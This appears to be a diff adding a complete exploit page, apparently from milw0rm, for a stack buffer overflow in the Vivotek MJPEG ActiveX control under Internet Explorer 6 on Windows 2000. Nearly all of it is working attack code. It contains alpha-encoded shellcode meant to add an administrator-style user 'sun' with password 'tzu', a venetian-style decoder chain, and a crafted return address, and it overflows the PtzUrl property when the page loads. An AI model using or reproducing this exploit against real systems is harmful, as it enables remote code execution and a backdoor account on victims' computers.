@@ -1,0 +1,200 @@
+<!-- IE 6 / Vivotek Motion Jpeg Control (MjpegDecoder.dll 2.0.0.13)
+remote buffer overflow exploit / win 2k sp4 en version
+by rgod
+site: retrogod.altervista.org
+
+software site: http://www.vivotek.com/
+"VIVOTEK INC. is a leading IP surveillance camera and Network
+camera firm specialized in IP camera, Wireless network camera,
+IP surveillance camera"
+
+some notes,
+PtzUrl property is vulnerable to a stack based buffer overflow
+we are in control of EIP, ESI, EDI, EBP , *all* in UNICODE
+expanded strings
+I used the "venetian method" to fully patch the shellcode
+This works from remote (2 on 3) or by dragging the html file
+into the browser window, not by clicking it
+
+Object safety report:
+
+RegKey Safe for Script: True
+RegKey Safe for Init: True
+Implements IObjectSafety: False
+-->
+<HTML>
+<OBJECT classid='clsid:EAA105FE-7BBD-4196-8B96-D46743894195' id='MjpegControl' ></OBJECT>
+<script language='vbscript'>
+
+' metasploit one, alpha2... add a user 'sun' with pass 'tzu'
+FRAGMENT = unescape("%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%6e%40%71%40%71%40%71%40%71%40%71%40%72%40%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%eb%59%05%f8%ff%49%49%49%49%49%49%49%49%49%51%6a%58%30%31%42%42%78%42%42%41%30%41%50%42%75%39%6c%48%44%70%70%50%4b%35%6c%4b%6c%65%58%31%6f%4b%6f%38%4b%4f%70%61%6b%69%6b%34%6b%51%6e%31%70%79%6c%64%30%64%37%31%7a%4d%51%72%6b%54%4b%34%44%64%65%45%6b%4f%44%31%6b%66%4b%6c%6b%4b%6f%4c%71%4b%4b%4c%6b%51%4b%79%6c%54%74%73%61%50%64%4b%70%50%75%70%58%6c%4b%50%6c%6b%50%6c%4d%6b%38%48%4b%79%6b%30%50%70%30%70%4b%78%4c%6f%41%46%50%46%69%58%53%70%6b%50%48%6e%38%72%53%38%78%4e%6a%4e%37%6f%47%73%6d%44%4e%35%38%45%50%6f%43%30%4e%45%34%30%55%33%75%42%70%43%65%4e%50%54%58%35%70%4f%61%44%34%50%56%56%50%4e%55%64%50%6c%6f%63%51%4c%47%72%6f%75%70%30%71%44%6d%49%6e%79%73%74%62%41%64%6f%62%63%50%33%65%4e%50%6f%71%34%74%50%c3")
+
+c1 = unescape("%95")                : REM xchg eax, ebp
+C2 = unescape("%6e%05%ff%02")       : REM add eax 0200ff00h
+C3 = unescape("%6e%2d%12%02")       : REM sub eax 02001200h
+C4 = unescape("%6e%40%6e")          : REM inc eax
+C5 = unescape("%80%90%6e%40%6e%40") : REM add byte ptr eax 90 , inc eax twice
+C6 = unescape("%6e%80%90%6e%40%6e%40") : REM and again ... add byte ptr esi works as nop
+
+CODE = C1 & C2 & C3 & C4 & C5 & C6 & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%90%6e%40%6e%40") & _
+unescape("%6e%80%90%6e%40%6e%40%6e%80%03%6e%40%6e%40") & _
+unescape("%6e%80%eb%6e%40%6e%40%6e%80%e8%6e%40%6e%40") & _
+unescape("%6e%80%ff%6e%40%6e%40%6e%80%ff%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%49%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%49%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%49%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%49%6e%40%6e%40") & _
+unescape("%6e%80%37%6e%40%6e%40%6e%80%5a%6e%40%6e%40") & _
+unescape("%6e%80%68%6e%40%6e%40%6e%80%50%6e%40%6e%40") & _
+unescape("%6e%80%41%6e%40%6e%40%6e%80%41%6e%40%6e%40") & _
+unescape("%6e%80%6b%6e%40%6e%40%6e%80%41%6e%40%6e%40") & _
+unescape("%6e%80%32%6e%40%6e%40%6e%80%42%6e%40%6e%40") & _
+unescape("%6e%80%32%6e%40%6e%40%6e%80%41%6e%40%6e%40") & _
+unescape("%6e%80%41%6e%40%6e%40%6e%80%58%6e%40%6e%40") & _
+unescape("%6e%80%38%6e%40%6e%40%6e%80%42%6e%40%6e%40") & _
+unescape("%6e%80%6d%6e%40%6e%40%6e%80%69%6e%40%6e%40") & _
+unescape("%6e%80%4a%6e%40%6e%40%6e%80%70%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%57%6e%40%6e%40") & _
+unescape("%6e%80%35%6e%40%6e%40%6e%80%6c%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%55%6e%40%6e%40") & _
+unescape("%6e%80%4c%6e%40%6e%40%6e%80%41%6e%40%6e%40") & _
+unescape("%6e%80%46%6e%40%6e%40%6e%80%32%6e%40%6e%40") & _
+unescape("%6e%80%33%6e%40%6e%40%6e%80%48%6e%40%6e%40") & _
+unescape("%6e%80%6c%6e%40%6e%40%6e%80%52%6e%40%6e%40") & _
+unescape("%6e%80%72%6e%40%6e%40%6e%80%4c%6e%40%6e%40") & _
+unescape("%6e%80%61%6e%40%6e%40%6e%80%75%6e%40%6e%40") & _
+unescape("%6e%80%76%6e%40%6e%40%6e%80%58%6e%40%6e%40") & _
+unescape("%6e%80%52%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%50%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%55%6e%40%6e%40%6e%80%58%6e%40%6e%40") & _
+unescape("%6e%80%70%6e%40%6e%40%6e%80%6b%6e%40%6e%40") & _
+unescape("%6e%80%4e%6e%40%6e%40%6e%80%6c%6e%40%6e%40") & _
+unescape("%6e%80%6e%6e%40%6e%40%6e%80%6f%6e%40%6e%40") & _
+unescape("%6e%80%51%6e%40%6e%40%6e%80%33%6e%40%6e%40") & _
+unescape("%6e%80%6f%6e%40%6e%40%6e%80%4b%6e%40%6e%40") & _
+unescape("%6e%80%44%6e%40%6e%40%6e%80%65%6e%40%6e%40") & _
+unescape("%6e%80%6b%6e%40%6e%40%6e%80%38%6e%40%6e%40") & _
+unescape("%6e%80%4a%6e%40%6e%40%6e%80%77%6e%40%6e%40") & _
+unescape("%6e%80%36%6e%40%6e%40%6e%80%76%6e%40%6e%40") & _
+unescape("%6e%80%56%6e%40%6e%40%6e%80%51%6e%40%6e%40") & _
+unescape("%6e%80%4a%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%61%6e%40%6e%40%6e%80%66%6e%40%6e%40") & _
+unescape("%6e%80%43%6e%40%6e%40%6e%80%48%6e%40%6e%40") & _
+unescape("%6e%80%50%6e%40%6e%40%6e%80%6c%6e%40%6e%40") & _
+unescape("%6e%80%36%6e%40%6e%40%6e%80%62%6e%40%6e%40") & _
+unescape("%6e%80%6c%6e%40%6e%40%6e%80%33%6e%40%6e%40") & _
+unescape("%6e%80%55%6e%40%6e%40%6e%80%67%6e%40%6e%40") & _
+unescape("%6e%80%7a%6e%40%6e%40%6e%80%4c%6e%40%6e%40") & _
+unescape("%6e%80%75%6e%40%6e%40%6e%80%4e%6e%40%6e%40") & _
+unescape("%6e%80%75%6e%40%6e%40%6e%80%4a%6e%40%6e%40") & _
+unescape("%6e%80%4f%6e%40%6e%40%6e%80%43%6e%40%6e%40") & _
+unescape("%6e%80%77%6e%40%6e%40%6e%80%67%6e%40%6e%40") & _
+unescape("%6e%80%4b%6e%40%6e%40%6e%80%55%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%30%6e%40%6e%40") & _
+unescape("%6e%80%6c%6e%40%6e%40%6e%80%43%6e%40%6e%40") & _
+unescape("%6e%80%66%6e%40%6e%40%6e%80%6f%6e%40%6e%40") & _
+unescape("%6e%80%6b%6e%40%6e%40%6e%80%32%6e%40%6e%40") & _
+unescape("%6e%80%66%6e%40%6e%40%6e%80%4c%6e%40%6e%40") & _
+unescape("%6e%80%51%6e%40%6e%40%6e%80%46%6e%40%6e%40") & _
+unescape("%6e%80%6e%6e%40%6e%40%6e%80%42%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%6e%6e%40%6e%40%6e%80%45%6e%40%6e%40") & _
+unescape("%6e%80%54%6e%40%6e%40%6e%80%7a%6e%40%6e%40") & _
+unescape("%6e%80%37%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%4b%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%53%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%4c%6e%40%6e%40") & _
+unescape("%6e%80%71%6e%40%6e%40%6e%80%77%6e%40%6e%40") & _
+unescape("%6e%80%53%6e%40%6e%40%6e%80%47%6e%40%6e%40") & _
+unescape("%6e%80%6b%6e%40%6e%40%6e%80%73%6e%40%6e%40") & _
+unescape("%6e%80%51%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%6a%6e%40%6e%40%6e%80%4d%6e%40%6e%40") & _
+unescape("%6e%80%4b%6e%40%6e%40%6e%80%61%6e%40%6e%40") & _
+unescape("%6e%80%30%6e%40%6e%40%6e%80%32%6e%40%6e%40") & _
+unescape("%6e%80%61%6e%40%6e%40%6e%80%4e%6e%40%6e%40") & _
+unescape("%6e%80%49%6e%40%6e%40%6e%80%32%6e%40%6e%40") & _
+unescape("%6e%80%55%6e%40%6e%40%6e%80%6e%6e%40%6e%40") & _
+unescape("%6e%80%4b%6e%40%6e%40%6e%80%4e%6e%40%6e%40") & _
+unescape("%6e%80%64%6e%40%6e%40%6e%80%46%6e%40%6e%40") & _
+unescape("%6e%80%59%6e%40%6e%40%6e%80%7a%6e%40%6e%40") & _
+unescape("%6e%80%51%6e%40%6e%40%6e%80%30%6e%40%6e%40") & _
+unescape("%6e%80%62%6e%40%6e%40%6e%80%66%6e%40%6e%40") & _
+unescape("%6e%80%55%6e%40%6e%40%6e%80%64%6e%40%6e%40") & _
+unescape("%6e%80%62%6e%40%6e%40%6e%80%67%6e%40%6e%40") & _
+unescape("%6e%80%54%6e%40%6e%40%6e%80%52%6e%40%6e%40") & _
+unescape("%6e%80%51%6e%40%6e%40%6e%80%72%6e%40%6e%40") & _
+unescape("%6e%80%32%6e%40%6e%40%6e%80%74%6e%40%6e%40") & _
+unescape("%6e%80%71%6e%40%6e%40%6e%80%52%6e%40%6e%40") & _
+unescape("%6e%80%74%6e%40%6e%40%6e%80%61%6e%40%6e%40") & _
+unescape("%6e%80%53%6e%40%6e%40%6e%80%35%6e%40%6e%40") & _
+unescape("%6e%80%53%6e%40%6e%40%6e%80%31%6e%40%6e%40") & _
+unescape("%6e%80%72%6e%40%6e%40%6e%80%57%6e%40%6e%40") & _
+unescape("%6e%80%62%6e%40%6e%40%6e%80%72%6e%40%6e%40") & _
+unescape("%6e%80%54%6e%40%6e%40%6e%80%65%6e%40%6e%40") & _
+unescape("%6e%80%36%6e%40%6e%40%6e%80%52%6e%40%6e%40") & _
+unescape("%6e%80%50%6e%40%6e%40%6e%80%67%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%37%6e%40%6e%40") & _
+unescape("%6e%80%77%6e%40%6e%40%6e%80%37%6e%40%6e%40") & _
+unescape("%6e%80%72%6e%40%6e%40%6e%80%33%6e%40%6e%40") & _
+unescape("%6e%80%31%6e%40%6e%40%6e%80%77%6e%40%6e%40") & _
+unescape("%6e%80%50%6e%40%6e%40%6e%80%70%6e%40%6e%40") & _
+unescape("%6e%80%70%6e%40%6e%40%6e%80%73%6e%40%6e%40") & _
+unescape("%6e%80%62%6e%40%6e%40%6e%80%52%6e%40%6e%40") & _
+unescape("%6e%80%30%6e%40%6e%40%6e%80%70%6e%40%6e%40") & _
+unescape("%6e%80%70%6e%40%6e%40%6e%80%30%6e%40%6e%40") & _
+unescape("%6e%80%61%6e%40%6e%40%6e%80%33%6e%40%6e%40") & _
+unescape("%6e%80%62%6e%40%6e%40%6e%80%70%6e%40%6e%40") & _
+unescape("%6e%80%42%6e%40%6e%40%6e%80%70%6e%40%6e%40") & _
+unescape("%6e%80%61%6e%40%6e%40%6e%80%50%6e%40%6e%40") & _
+unescape("%6e%80%70%6e%40%6e%40%6e%80%31%6e%40%6e%40") & _
+unescape("%6e%80%32%6e%40%6e%40%6e%80%31%6e%40%6e%40") & _
+unescape("%6e%80%70%6e%40%6e%40%6e%80%41%6e%40%6e%40") & _
+unescape("%6e%80%71%6e%40%6e%40%6e%80%57%6e%40%6e%40") & _
+unescape("%6e%80%74%6e%40%6e%40%6e%80%61%6e%40%6e%40") & _
+unescape("%6e%80%32%6e%40%6e%40%6e%80%57%6e%40%6e%40") & _
+unescape("%6e%80%64%6e%40%6e%40%6e%80%53%6e%40%6e%40") & _
+unescape("%6e%80%47%6e%40%6e%40%6e%80%63%6e%40%6e%40") & _
+unescape("%6e%80%75%6e%40%6e%40%6e%80%90%6e%40%6e%40%6e%40%6e")
+
+bof         = string(262,unescape("%12"))
+useful_junk = unescape("%12%12%12%12") 'not touch
+junk        = string(32,unescape("%12"))
+eip         = unescape("%23%7d") : REM 0x007d0023   call edi,  module comctl32 found with msfpescan
+suntzu      = bof + eip + useful_junk + junk + CODE + FRAGMENT + string(16,unescape("%90"))
+
+MjpegControl.PtzUrl = suntzu
+
+</script>
+</HTML>
+
+# milw0rm.com [2007-05-31]
